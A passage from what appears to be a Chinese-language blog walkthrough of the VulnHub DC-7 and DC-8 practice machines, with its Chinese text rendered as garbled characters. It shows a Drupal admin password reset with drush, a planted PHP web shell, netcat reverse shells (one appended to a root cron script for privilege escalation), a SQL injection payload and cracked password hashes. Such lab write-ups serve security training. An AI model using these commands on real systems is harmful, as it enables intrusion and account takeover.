</p><p>æˆ‘ä»¬æ¥æ‰¾æ‰¾æœ‰æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221018202308173.png" alt="image-20221018202308173"></p><p>æˆ‘ä»¬å…ˆæ‰“å¼€<code>backups</code>æ–‡ä»¶å¤¹</p><p><img src="/2022/08/29/vulnhub/image-20221018202658047.png" alt="image-20221018202658047"></p><p>å‘ç°æ˜¯ä¸¤ä¸ª<code>.gpg</code>æ–‡ä»¶</p><blockquote><p><code>gpg</code>æ–‡ä»¶<br>å°±æ˜¯ä¸€ä¸ªåŠ å¯†æ–‡ä»¶</p></blockquote><p>è€Œæˆ‘ä»¬ç°åœ¨æ²¡æœ‰ä¿¡æ¯å’Œå¯†ç ï¼Œæ‰€ä»¥æˆ‘ä»¬å†çœ‹çœ‹å¦ä¸€ä¸ªæ–‡ä»¶</p><blockquote><p>è¿”å›ä¸Šçº§ç›®å½•<br><code>cat mbox</code> </p></blockquote><p><img src="/2022/08/29/vulnhub/image-20221018203146128.png" alt="image-20221018203146128"></p><p>å‘ç°æ˜¯<code>root</code>ç”¨æˆ·å‘½ä»¤æ‰§è¡Œçš„è®°å½•</p><p>å‘ç°äº†</p><blockquote><p><code>Database dump saved to /home/dc7user/backups/website.sql</code><br>&#x2F;&#x2F;æ•°æ®åº“ä¿¡æ¯å­˜å…¥website.sqlæ–‡ä»¶<br>&#x2F;&#x2F;ç„¶årootæ‰§è¡Œäº†åŠ å¯†è„šæœ¬åŠ å¯†æ•°æ®åº“æ–‡ä»¶</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20221018203403493.png" alt="image-20221018203403493"></p><h3 id="å®šæ—¶ä»»åŠ¡ã€cronï¼ˆcrondï¼‰ã€‘"><a href="#å®šæ—¶ä»»åŠ¡ã€cronï¼ˆcrondï¼‰ã€‘" class="headerlink" title="*å®šæ—¶ä»»åŠ¡ã€cronï¼ˆcrondï¼‰ã€‘"></a>*å®šæ—¶ä»»åŠ¡ã€cronï¼ˆcrondï¼‰ã€‘</h3><p>æˆ‘ä»¬å‘ç°åœ¨<code>root</code>ç”¨æˆ·æ‰§è¡ŒåŠ å¯†è„šæœ¬ä¹‹å‰æœ‰ä¸€ä¸ª<code>Cron</code></p><blockquote><p><code>Cron</code>å‘ç°æ˜¯å®šæ—¶ä»»åŠ¡ï¼Œä»£è¡¨è¿‡ä¸€æ®µæ—¶é—´å°±æ‰§è¡Œä¸€æ¬¡ï¼Œä»¥æ¥æ›´æ–°æ•°æ®åº“å¤‡ä»½æ–‡ä»¶ã€<code>backups</code>ã€‘</p><p>è¿™æ˜¯ä¸ªå®šæ—¶ä»»åŠ¡ ç”¨<code>root</code> è¿è¡Œ<code>/opt/scripts/backups.sh</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20221018203434313.png" alt="image-20221018203434313"></p><h3 id="å…³é”®æ€è·¯"><a href="#å…³é”®æ€è·¯" class="headerlink" title="*å…³é”®æ€è·¯"></a>*å…³é”®æ€è·¯</h3><p>æŸ¥çœ‹ä¸‹æƒé™ä»€ä¹ˆçš„ï¼Œå‘ç°<code>www-data</code>æ‹¥æœ‰æ‰§è¡Œå’Œå†™çš„æƒé™ï¼Œæˆ‘ä»¬å½“å‰æƒé™æ²¡æœ‰å†™æƒé™ï¼Œçœ‹æ¥æ²¡åŠæ³•åŠ¨æ‰‹è„šäº†ã€‚</p><p><img src="/2022/08/29/vulnhub/image-20221018234503615.png" alt="image-20221018234503615"></p><h3 id><a href="#" class="headerlink" title></a></h3><p>ä½†æ˜¯å¦‚æœæˆ‘ä»¬è·å¾—äº†<code>www-data</code>çš„<code>shell</code> é‚£å°±å¯ä»¥å†™ç‚¹ä¸œè¥¿è¿›å»ï¼Œç„¶åä¾é <strong>è®¡åˆ’ä»»åŠ¡</strong>ï¼Œç”¨<code>root</code>å»è¿è¡Œï¼Œç„¶ååå¼¹<code>shell</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è·å¾—äº†<code>root</code>æƒé™çš„<code>shell</code>äº†ã€‚</p><h2 id="3-drushå‘½ä»¤å¯¹drupalä¿®æ”¹ç”¨æˆ·åå’Œå¯†ç "><a href="#3-drushå‘½ä»¤å¯¹drupalä¿®æ”¹ç”¨æˆ·åå’Œå¯†ç " class="headerlink" title="3.drushå‘½ä»¤å¯¹drupalä¿®æ”¹ç”¨æˆ·åå’Œå¯†ç "></a>3.<code>drush</code>å‘½ä»¤å¯¹<code>drupal</code>ä¿®æ”¹ç”¨æˆ·åå’Œå¯†ç </h2><p>æˆ‘ä»¬æŒ‰è·¯å¾„æŸ¥çœ‹è¯¥è„šæœ¬å†…å®¹</p><p><img src="/2022/08/29/vulnhub/image-20221018203742731.png" alt="image-20221018203742731"></p><p>æˆ‘ä»¬å‘ç°æœç„¶æ˜¯ä¸ªåŠ å¯†æ•°æ®åº“æ–‡ä»¶çš„è„šæœ¬ï¼Œä½†æ˜¯æˆ‘ä»¬ä»ç„¶ä¸çŸ¥é“å¯†ç </p><p>ä½†æ˜¯æˆ‘ä»¬å‘ç°äº†æ•°æ®åº“æ–‡ä»¶ä¼¼ä¹è¢«æ›´æ”¹è¿‡</p><p>å‡ºç°äº†ä¸€ä¸ªæ–°çš„å‘½ä»¤</p><blockquote><p><code>drush</code><br>&#x2F;&#x2F;drushå‘½ä»¤æ˜¯åœ¨drupalæ¡†æ¶ä¸­è¿›è¡Œé…ç½®çš„å‘½ä»¤ï¼Œå¯ä»¥ä¿®æ”¹ç”¨æˆ·åå’Œå¯†ç ï¼Œ<br>&#x2F;&#x2F;ä½†æ˜¯drushå¿…é¡»åœ¨drupalå®‰è£…ç›®å½•ä¸‹è¿›è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŒ‰è„šæœ¬ç»™çš„<br><code>cd /var/www/html/</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20221018204531647.png" alt="image-20221018204531647"></p><blockquote><p><code>cd /var/www/html</code><br><code>drush user-password admin:123456</code><br>&#x2F;&#x2F;ç”¨æˆ·å<code>admin</code>å’Œå¯†ç <code>123456</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20221018205540723.png" alt="image-20221018205540723"></p><p>ç„¶åæˆåŠŸä¿®æ”¹ç”¨æˆ·<code>admin</code>çš„å¯†ç ä¸º<code>123456</code></p><p><img src="/2022/08/29/vulnhub/image-20221018212431462.png" alt="image-20221018212431462"></p><h2 id="4-ç™»å½•ç½‘ç«™"><a href="#4-ç™»å½•ç½‘ç«™" class="headerlink" title="4.ç™»å½•ç½‘ç«™"></a>4.ç™»å½•ç½‘ç«™</h2><p>å½“æˆ‘ä»¬è¾“å…¥æˆ‘ä»¬ä¿®æ”¹åçš„å¯†ç åï¼ŒæˆåŠŸç™»å½•<code>admin</code>ç”¨æˆ·</p><p><img src="/2022/08/29/vulnhub/image-20221018212905392.png" alt="image-20221018212905392"></p><p>ç„¶åæˆ‘ä»¬ç»Ÿåˆä¸€ä¸‹æ€è·¯ï¼Œæˆ‘ä»¬è¿›å…¥äº†ç½‘ç«™åï¼Œåº”è¯¥å¦‚ä½•æ‹¿åˆ°<code>shell</code>ï¼Œé‚£è‚¯å®šéœ€è¦å†™æœ¨é©¬æˆ–è€…åå¼¹<code>shell</code></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦æ‰¾åˆ°å¯ä»¥ä¿®æ”¹å¹¶å¢åŠ <code>php</code>æ–‡ä»¶çš„çš„åœ°æ–¹</p><p>æˆ‘ä»¬å…ˆæ‰“å¼€<code>content</code>é¡µé¢ï¼Œå‘ç°æœ‰<code>å¼€å§‹.html</code>é¡µé¢</p><p><img src="/2022/08/29/vulnhub/image-20221018212952593.png" alt="image-20221018212952593"></p><p>ç‚¹å¼€æŸ¥çœ‹</p><p><img src="/2022/08/29/vulnhub/image-20221018215114742.png" alt="image-20221018215114742"></p><p>å‘ç°å¯ä»¥ä¿®æ”¹å†…å®¹ï¼Œçœ‹æ¥æˆ‘ä»¬å¯ä»¥è¯•è¯•ä¿®æ”¹å®ƒï¼Œå˜æˆæˆ‘ä»¬çš„æœ¨é©¬æ–‡ä»¶</p><p>ç»“æœå‘ç°æ–‡ä»¶åªèƒ½ä»¥<code>html</code>å½¢å¼æ‰§è¡Œï¼Œè€Œä¸èƒ½ä»¥<code>php</code>å½¢å¼æ‰§è¡Œ</p><p><img src="/2022/08/29/vulnhub/image-20221018215830844.png" alt="image-20221018215830844"></p><h3 id="æ·»åŠ phpæ‰§è¡Œæ’ä»¶"><a href="#æ·»åŠ phpæ‰§è¡Œæ’ä»¶" class="headerlink" title="æ·»åŠ phpæ‰§è¡Œæ’ä»¶"></a>æ·»åŠ phpæ‰§è¡Œæ’ä»¶</h3><p><code>drupal</code>æ¡†æ¶å¯ä»¥æ·»åŠ <code>php</code>æ–‡ä»¶æ’ä»¶ï¼Œä»è€Œèƒ½ä¿®æ”¹ä¸º<code>php</code>æ–‡ä»¶</p><p><img src="/2022/08/29/vulnhub/image-20221018220115382.png" alt="image-20221018220115382"></p><p>ç‚¹å‡»</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">install <span class="keyword">new</span> <span class="keyword">module</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221018220912473.png" alt="image-20221018220912473"></p><p>åœ¨<code>url</code>é‡Œå¡«å†™</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>ftp.drupal.org<span class="regexp">/files/</span>projects/php-<span class="number">8</span>.x-<span class="number">1</span>.x-dev.tar.gz</span><br></pre></td></tr></table></figure><p>ç„¶å<code>install</code></p><p><img src="/2022/08/29/vulnhub/image-20221018221952909.png" alt="image-20221018221952909"></p><p>ä½†æ˜¯æˆ‘è¿™é‡Œæ˜¾ç¤ºæ— æ³•è¿æ¥ç½‘ç«™ï¼Œé‚£æˆ‘ä»¬ç›´æ¥ä¸Šä¼ æ’ä»¶æ–‡ä»¶ä¹Ÿæ˜¯å¯ä»¥çš„</p><p><img src="/2022/08/29/vulnhub/image-20221018222047051.png" alt="image-20221018222047051"></p><p>ç„¶åæ·»åŠ æˆåŠŸ</p><p><img src="/2022/08/29/vulnhub/image-20221018222109470.png" alt="image-20221018222109470"></p><p>ç„¶ååœ¨<code>FILTERS</code>å¤„</p><p>å¯åŠ¨æ’ä»¶ã€å‹¾é€‰ã€‘</p><p><img src="/2022/08/29/vulnhub/image-20221018222451086.png" alt="image-20221018222451086"></p><p>æœ€åè®°å¾—è¿˜è¦<code>install</code></p><p><img src="/2022/08/29/vulnhub/image-20221018222512620.png" alt="image-20221018222512620"></p><p>ç„¶åæˆ‘ä»¬çš„æ–‡ä»¶å°±å¯ä»¥ä»¥<code>php</code>æ–‡ä»¶å½¢å¼æ‰§è¡Œäº†</p><h3 id="åŠ å…¥ä¸€å¥è¯æœ¨é©¬"><a href="#åŠ å…¥ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="åŠ å…¥ä¸€å¥è¯æœ¨é©¬"></a>åŠ å…¥ä¸€å¥è¯æœ¨é©¬</h3><p><img src="/2022/08/29/vulnhub/image-20221018232816262.png" alt="image-20221018232816262"></p><p>ã€è®°ä½<code>Text foromat</code>è¦æ”¹æˆ<code>PHP code</code>ã€‘</p><p>ç„¶åä¿å­˜å³å¯</p><h2 id="5-èšå‰‘è¿æ¥getshell"><a href="#5-èšå‰‘è¿æ¥getshell" class="headerlink" title="5.èšå‰‘è¿æ¥getshell"></a>5.èšå‰‘è¿æ¥getshell</h2><p>å› ä¸ºæˆ‘ä»¬æ˜¯åœ¨<code>welcome</code>é¡µé¢é‡Œæ’å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œæ‰€ä»¥ç›´æ¥è¿æ¥é¶æœºipå°±è¡Œ</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.133.146</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221018232842168.png" alt="image-20221018232842168"></p><p>è¿æ¥æˆåŠŸ</p><p>å¯åŠ¨è™šæ‹Ÿç»ˆç«¯</p><p><img src="/2022/08/29/vulnhub/image-20221018232923762.png" alt="image-20221018232923762"></p><p><code>getshell</code></p><p><img src="/2022/08/29/vulnhub/image-20221018233020910.png" alt="image-20221018233020910"></p><h2 id="6-åå¼¹shellæ‹¿www-data"><a href="#6-åå¼¹shellæ‹¿www-data" class="headerlink" title="6.åå¼¹shellæ‹¿www-data"></a>6.åå¼¹shellæ‹¿www-data</h2><p>æˆ‘ä»¬å…ˆå¼€å§‹ç›‘å¬<code>9999</code>ç«¯å£</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvvp <span class="number">9999</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221018233321886.png" alt="image-20221018233321886"></p><p>æˆ‘ä»¬åœ¨èšå‰‘çš„<code>shell</code>ä¸Š</p><p>å¼€å§‹åå¼¹<code>shell</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -e /bin/bash <span class="number">192.168.133.140</span> <span class="number">9999</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221018233814670.png" alt="image-20221018233814670"></p><p>ç„¶åæ‹¿åˆ°åå¼¹<code>shell</code></p><p><img src="/2022/08/29/vulnhub/image-20221018233713840.png" alt="image-20221018233713840"></p><p>è¿›å…¥äº¤äº’å¼shell</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -<span class="keyword">c</span> <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221018234804275.png" alt="image-20221018234804275"></p><h2 id="7-åˆ©ç”¨å®šæ—¶ä»»åŠ¡ã€cronã€‘ææƒroot"><a href="#7-åˆ©ç”¨å®šæ—¶ä»»åŠ¡ã€cronã€‘ææƒroot" class="headerlink" title="7.åˆ©ç”¨å®šæ—¶ä»»åŠ¡ã€cronã€‘ææƒroot"></a>7.åˆ©ç”¨å®šæ—¶ä»»åŠ¡ã€cronã€‘ææƒ<code>root</code></h2><p>æˆ‘ä»¬å‘ <code>backups.sh</code>å†™å…¥åå¼¹<code>shell</code>å‘½ä»¤</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;nc 192.168.133.140 12345 -e /bin/bash&quot;</span> &gt;&gt; /<span class="keyword">opt</span>/scripts/backups.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221018235007598.png" alt="image-20221018235007598"></p><p>ç„¶åæˆ‘ä»¬å†å¼€ä¸€ä¸ªæ§åˆ¶å°å¼€å§‹ç›‘å¬<code>12345</code>ç«¯å£</p><p><img src="/2022/08/29/vulnhub/image-20221018235124023.png" alt="image-20221018235124023"></p><p>ç„¶åæˆ‘ä»¬ç­‰å¾…å®šæ—¶ä»»åŠ¡æ‰§è¡Œï¼Œä¾¿å¯ä»¥æ‹¿åˆ°<code>shell</code>ã€æ—¶é—´æœ‰ç‚¹ä¹…ã€‘</p><p><img src="/2022/08/29/vulnhub/image-20221019000112748.png" alt="image-20221019000112748"></p><p>è¿æ¥æˆåŠŸåï¼Œåˆ°<code>root</code>ç›®å½•æŸ¥çœ‹<code>flag</code></p><p><img src="/2022/08/29/vulnhub/image-20221019123852041.png" alt="image-20221019123852041"></p><blockquote><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">888      <span class="number"> 888 </span>        <span class="number"> 888 </span>888      8888888b.                            <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888   o  <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span> &quot;Y88b                           <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888  d8b <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>                          <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888 d888b<span class="number"> 888 </span> .d88b. <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span> .d88b.  88888b.   .d88b. <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888d88888b888 d8P  Y8b<span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>d88&quot;&quot;88b<span class="number"> 888 </span>&quot;88b d8P  Y8b<span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">88888P Y88888<span class="number"> 88888888 </span>888<span class="number"> 888 </span>    <span class="number"> 888 </span>  <span class="number"> 888 </span>888 <span class="number"> 888 </span>888 <span class="number"> 888 </span>88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.    <span class="number"> 888 </span>888     <span class="number"> 888 </span> .d88P Y88..88P<span class="number"> 888 </span><span class="number"> 888 </span>Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888 <span class="number"> 888 </span>888      8888888P&quot;   &quot;Y88P&quot; <span class="number"> 888 </span><span class="number"> 888 </span> &quot;Y8888 <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br></pre></td></tr></table></figure><p><code>Congratulations!!!</code></p><p><code>Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those</code><br><code>who have provided feedback, and all those who have taken the time to complete these little</code><br><code>challenges.</code></p><p><code>I&#39;m sending out an especially big thanks to:</code></p><p><code>@4nqr34z</code><br><code>@D4mianWayne</code><br><code>@0xmzfr</code><br><code>@theart42</code></p><p><code>If you enjoyed this CTF, send me a tweet via @DCAU7.</code></p><p>æ„æ€æ˜¯ï¼š<br>æ­å–œï¼ï¼ï¼</p><p>å¸Œæœ›ä½ å–œæ¬¢ DC-7ã€‚åªæ˜¯æƒ³å‘æ‰€æœ‰è¿™äº›äººè¡¨ç¤ºè¡·å¿ƒçš„æ„Ÿè°¢<br>æä¾›åé¦ˆçš„äººï¼Œä»¥åŠæ‰€æœ‰èŠ±æ—¶é—´å®Œæˆè¿™äº›å°äº‹çš„äºº<br>æŒ‘æˆ˜ã€‚</p><p>æˆ‘è¦ç‰¹åˆ«æ„Ÿè°¢ï¼š</p><p>@4nqr34z<br>@D4mianWayne<br>@0xmzfr<br>@å¿ƒ42</p><p>å¦‚æœä½ å–œæ¬¢è¿™ä¸ª CTFï¼Œè¯·é€šè¿‡@DCAU7 ç»™æˆ‘å‘ä¸€æ¡æ¨æ–‡</p></blockquote><p><strong>ä¸€ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸ</strong></p><h1 id="å…«ã€DC8-åˆçº§"><a href="#å…«ã€DC8-åˆçº§" class="headerlink" title="å…«ã€DC8[åˆçº§]"></a>å…«ã€DC8[åˆçº§]</h1><p><strong>only one flag</strong></p><blockquote><p><code>hint:</code><br><code>This challenge is a bit of a hybrid between being an actual challenge, and being a &quot;proof of concept&quot; as to whether two-factor authentication installed and configured on Linux can prevent the Linux server from being exploited.</code></p><p><code>The &quot;proof of concept&quot; portion of this challenge eventuated as a result of a question being asked about two-factor authentication and Linux on Twitter, and also due to a suggestion by @theart42.</code></p><p><code>The ultimate goal of this challenge is to bypass two-factor authentication, get root and to read the one and only flag.</code></p><p><code>You probably wouldn&#39;t even know that two-factor authentication was installed and configured unless you attempt to login via SSH, but it&#39;s definitely there and doing it&#39;s job.</code></p><p>æ„æ€æ˜¯ï¼š<br>è¿™ä¸ªæŒ‘æˆ˜æœ‰ç‚¹æ··åˆå®é™…æŒ‘æˆ˜å’Œâ€œæ¦‚å¿µè¯æ˜â€ï¼Œå³åœ¨ Linux ä¸Šå®‰è£…å’Œé…ç½®çš„åŒå› ç´ èº«ä»½éªŒè¯æ˜¯å¦å¯ä»¥é˜²æ­¢ Linux æœåŠ¡å™¨è¢«åˆ©ç”¨ã€‚</p><p>è¿™ä¸ªæŒ‘æˆ˜çš„â€œæ¦‚å¿µè¯æ˜â€éƒ¨åˆ†æœ€ç»ˆæ˜¯ç”±äº Twitter ä¸Šå…³äºåŒå› ç´ èº«ä»½éªŒè¯å’Œ Linux çš„é—®é¢˜ï¼Œä»¥åŠ@theart42 çš„å»ºè®®ã€‚</p><p>æ­¤æŒ‘æˆ˜çš„æœ€ç»ˆç›®æ ‡æ˜¯ç»•è¿‡åŒé‡èº«ä»½éªŒè¯ï¼Œè·å– root æƒé™å¹¶è¯»å–å”¯ä¸€æ ‡å¿—ã€‚</p><p>é™¤éæ‚¨å°è¯•é€šè¿‡ SSH ç™»å½•ï¼Œå¦åˆ™æ‚¨å¯èƒ½ç”šè‡³ä¸çŸ¥é“å·²å®‰è£…å’Œé…ç½®äº†åŒå› ç´ èº«ä»½éªŒè¯ï¼Œä½†å®ƒè‚¯å®šå­˜åœ¨å¹¶ä¸”å¯ä»¥æ­£å¸¸å·¥ä½œã€‚</p></blockquote><h2 id="ä¿¡æ¯æ”¶é›†-7"><a href="#ä¿¡æ¯æ”¶é›†-7" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p> å…ˆ<code>nmap</code>æ‰«ä¸€ä¸‹</p><p><img src="/2022/08/29/vulnhub/image-20221102234939357.png" alt="image-20221102234939357"></p><blockquote><p>å‘ç°<br><code>22</code>ç«¯å£<br>è¿è¡Œç€<code>ssh</code></p><p>80ç«¯å£ä¸‹<br>å‘ç°æœ‰ä¸ª<code>include</code>é¡µé¢ï¼Œå¯èƒ½éœ€è¦åœ¨è¿™é‡Œä¸Šä¼ æœ¨é©¬æ‹¿shell<br>ç„¶åæœ‰<code>install.mysql.txt</code>ï¼Œçœ‹æ¥å¯èƒ½éœ€è¦ç”¨åˆ°æ•°æ®åº“</p></blockquote><p>å†<code>dirsearch</code>æ‰«ä¸€ä¸‹</p><p><img src="/2022/08/29/vulnhub/image-20221102235306844.png" alt="image-20221102235306844"></p><blockquote><p>å‘ç°æœ‰<code>/user/login</code>é¡µé¢ï¼ŒçŒœæµ‹æ˜¯ç™»å½•åå°çš„é¡µé¢<br>åé¢æ‰¾æ‰¾æœ‰æ²¡æœ‰è´¦å·å¯†ç ä¿¡æ¯</p></blockquote><p>å†çœ‹çœ‹<code>wapplzer</code></p><p><img src="/2022/08/29/vulnhub/image-20221103112318956.png" alt="image-20221103112318956"></p><h2 id="1-sqlæ³¨å…¥"><a href="#1-sqlæ³¨å…¥" class="headerlink" title="1.sqlæ³¨å…¥"></a>1.sqlæ³¨å…¥</h2><p>ç„¶ååˆ†æç½‘ç«™é¡µé¢</p><p>å‘ç°åœ¨<code>details</code>æ—¶ï¼Œ<code>url</code>å‡ºç°</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.133.147</span>/?nid=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221103112255720.png" alt="image-20221103112255720"></p><p>çœ‹åˆ°æ³¨å…¥å¤„ï¼Œå†ç»“åˆä¹‹å‰çš„<code>nmap</code>æ‰«æçš„ç»“æœï¼Œæœ‰<code>mysql</code>å®‰è£…ï¼ŒçŒœæµ‹å¯èƒ½å­˜åœ¨<code>sql</code>æ³¨å…¥</p><p>è¯•è¯•<code>sql</code>æ³¨å…¥æœ‰æ²¡æœ‰ååº”</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.133.147</span>/?nid=-<span class="number">1</span> union select schema_name from information_schema.schemata--+</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221103130411912.png" alt="image-20221103130411912"></p><p>çœ‹æ¥ç¡®å®æ˜¯å­˜åœ¨<code>sql</code>æ³¨å…¥</p><p>æ‰‹åŠ¨æ³¨ä¸éš¾ï¼Œå®Œå…¨æ²¡æœ‰è¿‡æ»¤ï¼Œä½†è¿˜æ˜¯ç”¨<code>sqlmap</code>ç›´æ¥æ¢­å“ˆ</p><p>æ•°æ®åº“çŸ¥é“äº†</p><p>å…ˆçœ‹çœ‹è¡¨</p><p><img src="/2022/08/29/vulnhub/image-20221103131256965.png" alt="image-20221103131256965"></p><p>çœ‹åˆ°æœ‰ä¸ª<code>users</code>åˆ—ï¼ŒæŸ¥çœ‹æœ‰æ²¡æœ‰æˆ‘ä»¬éœ€è¦çš„åå°ç™»å½•çš„è´¦å·å¯†ç </p><p>å‘ç°æœ‰ä¸¤ä¸ªç”¨æˆ·</p><p><img src="/2022/08/29/vulnhub/image-20221103131824229.png" alt="image-20221103131824229"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin <span class="variable">$S</span><span class="variable">$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z</span></span><br><span class="line">john <span class="variable">$S</span><span class="variable">$DqupvJbxVmqjr6cYePnx2A891ln7lsuku</span><span class="regexp">/3if/</span>oRVZJaz5mKC2vF</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å¯†ç æ˜¯åŠ å¯†çš„ï¼Œæˆ‘ä»¬ç”¨<code>john</code>çˆ†ç ´ä¸€ä¸‹</p><p>å…ˆæŠŠå¯†ç å†™å…¥å¯†ç æ–‡æœ¬<code>pass.txt</code></p><p><img src="/2022/08/29/vulnhub/image-20221103133656691.png" alt="image-20221103133656691"></p><p><img src="/2022/08/29/vulnhub/image-20221103133745514.png" alt="image-20221103133745514"></p><p>ç„¶åå°±ç”¨<code>john</code>è‡ªå¸¦çš„å¯†ç æœ¬å°±è¡Œ</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john <span class="keyword">pass</span>.txt</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å†è¿™é‡Œæˆ‘ç”¨äº†<code>johny</code></p><p><img src="/2022/08/29/vulnhub/image-20221103134419589.png" alt="image-20221103134419589"></p><p>ä¸€ä¸ªå›¾å½¢åŒ–çš„çˆ†ç ´å·¥å…·</p><p>è¿™é‡Œåªå¾—åˆ°<code>john</code>ç”¨æˆ·çš„å¯†ç </p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">turtle</span></span><br></pre></td></tr></table></figure><h2 id="2-åå°æ·»åŠ æœ¨é©¬"><a href="#2-åå°æ·»åŠ æœ¨é©¬" class="headerlink" title="2.åå°æ·»åŠ æœ¨é©¬"></a>2.åå°æ·»åŠ æœ¨é©¬</h2><p>æ‹¿åˆ°è´¦å·å¯†ç åï¼Œæˆ‘ä»¬åˆ°åå°ç™»å½•é¡µé¢è¿›è¡Œç™»å½•</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.147</span><span class="regexp">/user/</span>login</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221103134815814.png" alt="image-20221103134815814"></p><p>ç™»å½•æˆåŠŸï¼Œæ ¹æ®ä¹‹å‰æˆ‘ä»¬ä¿¡æ¯æ”¶é›†ï¼Œåœ¨<code>nmap</code>å¾—åˆ°çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸Šä¼ æœ¨é©¬æˆ–è€…ä¿®æ”¹æ–‡ä»¶å†…å®¹çš„åœ°æ–¹</p><p>åœ¨å³ä¸Šè§’æˆ‘ä»¬çœ‹åˆ°æœ‰ä¸ª<code>content</code></p><p>æ‰“å¼€çœ‹çœ‹é‡Œé¢æ˜¯ä¸æ˜¯å¯ä»¥ä¿®æ”¹</p><p><img src="/2022/08/29/vulnhub/image-20221103135017243.png" alt="image-20221103135017243"></p><p>ç»“æœå‘ç°<code>Contact Us</code>é¡µé¢æ–‡ä»¶å¯ä»¥è¿›è¡Œä¿®æ”¹</p><p>æ‰“å¼€çœ‹çœ‹ï¼Œå‘ç°åœ¨<code>edit</code>æ²¡æœ‰ä¿®æ”¹çš„åœ°æ–¹</p><p><img src="/2022/08/29/vulnhub/image-20221103142531482.png" alt="image-20221103142531482"></p><p>äºæ˜¯æ‰¾äº†æ‰¾ç½‘ç«™æºç åœ¨</p><p><img src="/2022/08/29/vulnhub/image-20221103143057684.png" 